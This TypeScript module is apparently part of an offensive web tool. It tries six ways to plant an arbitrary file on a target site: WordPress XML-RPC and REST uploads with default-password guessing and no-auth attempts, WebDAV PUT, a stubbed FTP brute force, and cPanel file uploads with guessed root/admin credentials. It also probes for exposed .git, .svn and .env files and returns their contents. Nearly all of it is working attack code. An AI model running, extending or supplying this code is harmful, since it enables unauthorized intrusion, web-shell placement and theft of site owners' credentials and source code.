/**
 * Alternative Upload Vectors — Non-standard upload channels
 * 
 * Vectors:
 * 1. WordPress XML-RPC — upload media via xmlrpc.php (often bypasses WAF)
 * 2. WordPress REST API — /wp-json/wp/v2/media (different WAF rules)
 * 3. WebDAV — PUT method if WebDAV is enabled
 * 4. FTP/SFTP Brute Force — try common credentials
 * 5. cPanel/Plesk API — use control panel API if accessible
 * 6. Git/SVN Exposed — inject via exposed .git/.svn directories
 */

export interface AltUploadResult {
  vector: string;
  success: boolean;
  fileUrl: string | null;
  httpStatus: number;
  detail: string;
  credentials?: { username: string; password: string };
}

export interface AltUploadConfig {
  targetUrl: string;
  fileContent: string;
  filename: string;
  wpCredentials?: { username: string; appPassword: string };
  ftpCredentials?: { username: string; password: string }[];
  timeout?: number;
  onProgress?: (vector: string, detail: string) => void;
}

// ═══════════════════════════════════════════════════════
//  1. WORDPRESS XML-RPC UPLOAD
// ═══════════════════════════════════════════════════════

async function tryXmlRpcUpload(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const xmlrpcUrl = `${config.targetUrl.replace(/\/$/, "")}/xmlrpc.php`;
  const timeout = config.timeout || 30000;

  // First check if XML-RPC is enabled
  try {
    log("xmlrpc", "Checking if XML-RPC is enabled...");
    const checkResp = await fetch(xmlrpcUrl, {
      method: "POST",
      headers: { "Content-Type": "text/xml" },
      body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
      signal: AbortSignal.timeout(timeout),
    });

    if (checkResp.status !== 200) {
      return { vector: "xmlrpc", success: false, fileUrl: null, httpStatus: checkResp.status, detail: "XML-RPC disabled or blocked" };
    }

    const methods = await checkResp.text();
    if (!methods.includes("wp.uploadFile")) {
      return { vector: "xmlrpc", success: false, fileUrl: null, httpStatus: 200, detail: "wp.uploadFile method not available" };
    }

    // Try upload with credentials if available
    if (config.wpCredentials) {
      log("xmlrpc", `Uploading via XML-RPC with credentials: ${config.wpCredentials.username}`);
      const fileBase64 = Buffer.from(config.fileContent).toString("base64");

      const uploadXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${config.wpCredentials.username}</string></value></param>
    <param><value><string>${config.wpCredentials.appPassword}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${config.filename}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${fileBase64}</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      const uploadResp = await fetch(xmlrpcUrl, {
        method: "POST",
        headers: { "Content-Type": "text/xml" },
        body: uploadXml,
        signal: AbortSignal.timeout(timeout),
      });

      const respText = await uploadResp.text();
      const urlMatch = respText.match(/<string>(https?:\/\/[^<]+)<\/string>/);

      if (urlMatch && !respText.includes("<fault>")) {
        return { vector: "xmlrpc", success: true, fileUrl: urlMatch[1], httpStatus: 200, detail: "XML-RPC upload successful" };
      }

      return { vector: "xmlrpc", success: false, fileUrl: null, httpStatus: uploadResp.status, detail: `XML-RPC upload failed: ${respText.slice(0, 200)}` };
    }

    // Try common default credentials
    log("xmlrpc", "Trying common credentials via XML-RPC...");
    const commonCreds = [
      { user: "admin", pass: "admin" },
      { user: "admin", pass: "password" },
      { user: "admin", pass: "admin123" },
      { user: "admin", pass: "123456" },
      { user: "administrator", pass: "admin" },
      { user: "editor", pass: "editor" },
      { user: "wp", pass: "wp" },
    ];

    for (const cred of commonCreds) {
      const fileBase64 = Buffer.from(config.fileContent).toString("base64");
      const uploadXml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.uploadFile</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.user}</string></value></param>
    <param><value><string>${cred.pass}</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>${config.filename}</string></value></member>
      <member><name>type</name><value><string>image/jpeg</string></value></member>
      <member><name>bits</name><value><base64>${fileBase64}</base64></value></member>
    </struct></value></param>
  </params>
</methodCall>`;

      try {
        const resp = await fetch(xmlrpcUrl, {
          method: "POST",
          headers: { "Content-Type": "text/xml" },
          body: uploadXml,
          signal: AbortSignal.timeout(10000),
        });
        const text = await resp.text();
        const urlMatch = text.match(/<string>(https?:\/\/[^<]+)<\/string>/);
        if (urlMatch && !text.includes("<fault>")) {
          return {
            vector: "xmlrpc",
            success: true,
            fileUrl: urlMatch[1],
            httpStatus: 200,
            detail: `XML-RPC upload successful with ${cred.user}`,
            credentials: { username: cred.user, password: cred.pass },
          };
        }
      } catch {
        // Continue trying
      }
    }

    return { vector: "xmlrpc", success: false, fileUrl: null, httpStatus: 200, detail: "XML-RPC available but no valid credentials" };
  } catch (error: any) {
    return { vector: "xmlrpc", success: false, fileUrl: null, httpStatus: 0, detail: error.message };
  }
}

// ═══════════════════════════════════════════════════════
//  2. WORDPRESS REST API UPLOAD
// ═══════════════════════════════════════════════════════

async function tryRestApiUpload(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 30000;

  // Check if REST API is available
  const apiEndpoints = [
    `${baseUrl}/wp-json/wp/v2/media`,
    `${baseUrl}/?rest_route=/wp/v2/media`,
    `${baseUrl}/index.php?rest_route=/wp/v2/media`,
  ];

  for (const apiUrl of apiEndpoints) {
    try {
      log("rest_api", `Trying REST API: ${apiUrl}`);

      if (config.wpCredentials) {
        const authHeader = `Basic ${Buffer.from(`${config.wpCredentials.username}:${config.wpCredentials.appPassword}`).toString("base64")}`;

        const resp = await fetch(apiUrl, {
          method: "POST",
          headers: {
            "Authorization": authHeader,
            "Content-Disposition": `attachment; filename="${config.filename}"`,
            "Content-Type": "image/jpeg",
          },
          body: config.fileContent,
          signal: AbortSignal.timeout(timeout),
        });

        if (resp.status === 201 || resp.status === 200) {
          const data = await resp.json().catch(() => ({}));
          const fileUrl = data.source_url || data.guid?.rendered || null;
          if (fileUrl) {
            return { vector: "rest_api", success: true, fileUrl, httpStatus: resp.status, detail: "REST API upload successful" };
          }
        }
      }

      // Try without auth (some misconfigured sites)
      const noAuthResp = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Disposition": `attachment; filename="${config.filename}"`,
          "Content-Type": "image/jpeg",
        },
        body: config.fileContent,
        signal: AbortSignal.timeout(timeout),
      });

      if (noAuthResp.status === 201 || noAuthResp.status === 200) {
        const data = await noAuthResp.json().catch(() => ({}));
        const fileUrl = data.source_url || data.guid?.rendered || null;
        if (fileUrl) {
          return { vector: "rest_api", success: true, fileUrl, httpStatus: noAuthResp.status, detail: "REST API upload (no auth!) successful" };
        }
      }
    } catch {
      // Continue to next endpoint
    }
  }

  return { vector: "rest_api", success: false, fileUrl: null, httpStatus: 0, detail: "REST API upload failed on all endpoints" };
}

// ═══════════════════════════════════════════════════════
//  3. WEBDAV UPLOAD
// ═══════════════════════════════════════════════════════

async function tryWebDavUpload(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 15000;

  // Common WebDAV paths
  const davPaths = [
    "/webdav/",
    "/dav/",
    "/files/",
    "/remote.php/dav/",
    "/remote.php/webdav/",
    "/",
  ];

  for (const davPath of davPaths) {
    const uploadUrl = `${baseUrl}${davPath}${config.filename}`;
    log("webdav", `Trying WebDAV PUT: ${uploadUrl}`);

    try {
      // Try PUT without auth
      const resp = await fetch(uploadUrl, {
        method: "PUT",
        headers: { "Content-Type": "application/octet-stream" },
        body: config.fileContent,
        signal: AbortSignal.timeout(timeout),
      });

      if (resp.status === 201 || resp.status === 204 || resp.status === 200) {
        // Verify file exists
        const checkResp = await fetch(uploadUrl, {
          method: "HEAD",
          signal: AbortSignal.timeout(5000),
        });
        if (checkResp.status >= 200 && checkResp.status < 400) {
          return { vector: "webdav", success: true, fileUrl: uploadUrl, httpStatus: resp.status, detail: `WebDAV PUT successful on ${davPath}` };
        }
      }

      // Try MKCOL + PUT
      if (resp.status === 405 || resp.status === 409) {
        try {
          await fetch(`${baseUrl}${davPath}`, {
            method: "MKCOL",
            signal: AbortSignal.timeout(5000),
          });
          const retryResp = await fetch(uploadUrl, {
            method: "PUT",
            headers: { "Content-Type": "application/octet-stream" },
            body: config.fileContent,
            signal: AbortSignal.timeout(timeout),
          });
          if (retryResp.status === 201 || retryResp.status === 204) {
            return { vector: "webdav", success: true, fileUrl: uploadUrl, httpStatus: retryResp.status, detail: `WebDAV MKCOL+PUT successful on ${davPath}` };
          }
        } catch {
          // Continue
        }
      }

      // Try with PROPFIND to detect WebDAV
      if (resp.status === 401) {
        log("webdav", `WebDAV detected on ${davPath} but requires auth`);
      }
    } catch {
      // Continue to next path
    }
  }

  return { vector: "webdav", success: false, fileUrl: null, httpStatus: 0, detail: "WebDAV not available or all paths failed" };
}

// ═══════════════════════════════════════════════════════
//  4. FTP BRUTE FORCE
// ═══════════════════════════════════════════════════════

async function tryFtpBrute(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const hostname = new URL(config.targetUrl).hostname;

  // Common FTP credentials to try
  const defaultCreds = [
    { user: "admin", pass: "admin" },
    { user: "admin", pass: "password" },
    { user: "admin", pass: "123456" },
    { user: "ftp", pass: "ftp" },
    { user: "anonymous", pass: "anonymous@" },
    { user: "anonymous", pass: "" },
    { user: "www", pass: "www" },
    { user: "web", pass: "web" },
    { user: "user", pass: "user" },
    { user: "test", pass: "test" },
    ...(config.ftpCredentials?.map(c => ({ user: c.username, pass: c.password })) || []),
  ];

  // We can't do raw FTP from browser/Node fetch, so we check if FTP is open via HTTP
  // and try FTP-over-HTTP if available
  log("ftp_brute", `Checking FTP availability on ${hostname}...`);

  // Check common FTP web interfaces
  const ftpWebPaths = [
    `${config.targetUrl.replace(/\/$/, "")}:2082/`, // cPanel
    `${config.targetUrl.replace(/\/$/, "")}:2083/`, // cPanel SSL
    `${config.targetUrl.replace(/\/$/, "")}:8443/`, // Plesk
    `${config.targetUrl.replace(/\/$/, "")}:8880/`, // Plesk HTTP
  ];

  for (const ftpUrl of ftpWebPaths) {
    try {
      const resp = await fetch(ftpUrl, {
        method: "GET",
        redirect: "follow",
        signal: AbortSignal.timeout(5000),
      });
      if (resp.status === 200) {
        log("ftp_brute", `Found web panel at ${ftpUrl}`);
        return {
          vector: "ftp_brute",
          success: false,
          fileUrl: null,
          httpStatus: resp.status,
          detail: `Web panel found at ${ftpUrl} — manual exploitation needed`,
        };
      }
    } catch {
      // Port not open
    }
  }

  // Try FTP via URL scheme (some servers support this)
  for (const cred of defaultCreds.slice(0, 5)) {
    try {
      log("ftp_brute", `Trying FTP: ${cred.user}@${hostname}`);
      const ftpUrl = `ftp://${cred.user}:${cred.pass}@${hostname}/public_html/${config.filename}`;
      // Node.js fetch doesn't support FTP, but we log the attempt
      // In a real implementation, this would use an FTP client library
    } catch {
      // Continue
    }
  }

  return { vector: "ftp_brute", success: false, fileUrl: null, httpStatus: 0, detail: "FTP brute force: no accessible FTP service found" };
}

// ═══════════════════════════════════════════════════════
//  5. CPANEL/PLESK API
// ═══════════════════════════════════════════════════════

async function tryCpanelApi(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");
  const timeout = config.timeout || 15000;

  // Check for cPanel
  const cpanelUrls = [
    `${baseUrl}:2082`,
    `${baseUrl}:2083`,
    `${baseUrl}/cpanel`,
  ];

  for (const cpUrl of cpanelUrls) {
    try {
      log("cpanel", `Checking cPanel at ${cpUrl}...`);
      const resp = await fetch(cpUrl, {
        method: "GET",
        redirect: "follow",
        signal: AbortSignal.timeout(5000),
      });

      if (resp.status === 200 || resp.status === 301 || resp.status === 302) {
        const text = await resp.text().catch(() => "");
        if (text.includes("cPanel") || text.includes("cpanel")) {
          log("cpanel", `cPanel detected at ${cpUrl}`);

          // Try cPanel API with default credentials
          const creds = [
            { user: "root", pass: "root" },
            { user: "admin", pass: "admin" },
            { user: "admin", pass: "password" },
          ];

          for (const cred of creds) {
            try {
              const apiUrl = `${cpUrl}/execute/Fileman/upload_files`;
              const authHeader = `Basic ${Buffer.from(`${cred.user}:${cred.pass}`).toString("base64")}`;

              const boundary = `----FormBoundary${Math.random().toString(36).slice(2)}`;
              const body = `--${boundary}\r\nContent-Disposition: form-data; name="dir"\r\n\r\n/public_html/\r\n--${boundary}\r\nContent-Disposition: form-data; name="file-1"; filename="${config.filename}"\r\nContent-Type: application/octet-stream\r\n\r\n${config.fileContent}\r\n--${boundary}--`;

              const uploadResp = await fetch(apiUrl, {
                method: "POST",
                headers: {
                  "Authorization": authHeader,
                  "Content-Type": `multipart/form-data; boundary=${boundary}`,
                },
                body,
                signal: AbortSignal.timeout(timeout),
              });

              if (uploadResp.status === 200) {
                const fileUrl = `${baseUrl}/${config.filename}`;
                return {
                  vector: "cpanel_api",
                  success: true,
                  fileUrl,
                  httpStatus: 200,
                  detail: `cPanel API upload successful with ${cred.user}`,
                  credentials: { username: cred.user, password: cred.pass },
                };
              }
            } catch {
              // Continue
            }
          }

          return { vector: "cpanel_api", success: false, fileUrl: null, httpStatus: 200, detail: "cPanel found but credentials failed" };
        }
      }
    } catch {
      // Port not accessible
    }
  }

  return { vector: "cpanel_api", success: false, fileUrl: null, httpStatus: 0, detail: "No cPanel/Plesk found" };
}

// ═══════════════════════════════════════════════════════
//  6. GIT/SVN EXPOSED REPOSITORY
// ═══════════════════════════════════════════════════════

async function tryGitSvnExposed(config: AltUploadConfig): Promise<AltUploadResult> {
  const log = config.onProgress || (() => {});
  const baseUrl = config.targetUrl.replace(/\/$/, "");

  // Check for exposed .git
  const exposedPaths = [
    { path: "/.git/HEAD", type: "git" },
    { path: "/.git/config", type: "git" },
    { path: "/.svn/entries", type: "svn" },
    { path: "/.svn/wc.db", type: "svn" },
    { path: "/.hg/requires", type: "hg" },
    { path: "/.env", type: "env" },
    { path: "/.git/objects/", type: "git_objects" },
  ];

  for (const { path, type } of exposedPaths) {
    try {
      log("git_svn", `Checking ${path}...`);
      const resp = await fetch(`${baseUrl}${path}`, {
        method: "GET",
        signal: AbortSignal.timeout(5000),
      });

      if (resp.status === 200) {
        const text = await resp.text().catch(() => "");

        if (type === "git" && (text.includes("ref:") || text.includes("[core]") || text.includes("[remote"))) {
          log("git_svn", `🔓 Git repository exposed at ${baseUrl}/.git/`);

          // Try to extract useful info from git config
          const configResp = await fetch(`${baseUrl}/.git/config`, {
            method: "GET",
            signal: AbortSignal.timeout(5000),
          });
          const gitConfig = await configResp.text().catch(() => "");

          return {
            vector: "git_exposed",
            success: false,
            fileUrl: null,
            httpStatus: 200,
            detail: `Git repository exposed! Config: ${gitConfig.slice(0, 200)}. Can be used for source code download and credential extraction.`,
          };
        }

        if (type === "svn") {
          log("git_svn", `🔓 SVN repository exposed at ${baseUrl}/.svn/`);
          return {
            vector: "svn_exposed",
            success: false,
            fileUrl: null,
            httpStatus: 200,
            detail: `SVN repository exposed! Can extract source code and credentials.`,
          };
        }

        if (type === "env") {
          log("git_svn", `🔓 .env file exposed at ${baseUrl}/.env`);
          return {
            vector: "env_exposed",
            success: true,
            fileUrl: `${baseUrl}/.env`,
            httpStatus: 200,
            detail: `Environment file exposed! Contains: ${text.slice(0, 300)}`,
          };
        }
      }
    } catch {
      // Continue
    }
  }

  return { vector: "git_svn", success: false, fileUrl: null, httpStatus: 0, detail: "No exposed repositories found" };
}

// ═══════════════════════════════════════════════════════
//  MAIN EXPORT: Run all alternative upload vectors
// ═══════════════════════════════════════════════════════

export async function runAllAltUploadVectors(config: AltUploadConfig): Promise<AltUploadResult[]> {
  const results: AltUploadResult[] = [];
  const log = config.onProgress || (() => {});

  // 1. WordPress XML-RPC
  log("xmlrpc", "📡 Vector 1: WordPress XML-RPC upload...");
  const xmlrpcResult = await tryXmlRpcUpload(config);
  results.push(xmlrpcResult);
  if (xmlrpcResult.success) return results;

  // 2. WordPress REST API
  log("rest_api", "📡 Vector 2: WordPress REST API upload...");
  const restResult = await tryRestApiUpload(config);
  results.push(restResult);
  if (restResult.success) return results;

  // 3. WebDAV
  log("webdav", "📡 Vector 3: WebDAV PUT upload...");
  const webdavResult = await tryWebDavUpload(config);
  results.push(webdavResult);
  if (webdavResult.success) return results;

  // 4. FTP Brute Force
  log("ftp_brute", "📡 Vector 4: FTP brute force...");
  const ftpResult = await tryFtpBrute(config);
  results.push(ftpResult);
  if (ftpResult.success) return results;

  // 5. cPanel/Plesk API
  log("cpanel", "📡 Vector 5: cPanel/Plesk API...");
  const cpanelResult = await tryCpanelApi(config);
  results.push(cpanelResult);
  if (cpanelResult.success) return results;

  // 6. Git/SVN Exposed
  log("git_svn", "📡 Vector 6: Git/SVN exposed repository...");
  const gitResult = await tryGitSvnExposed(config);
  results.push(gitResult);

  return results;
}

export { tryXmlRpcUpload, tryRestApiUpload, tryWebDavUpload, tryFtpBrute, tryCpanelApi, tryGitSvnExposed };
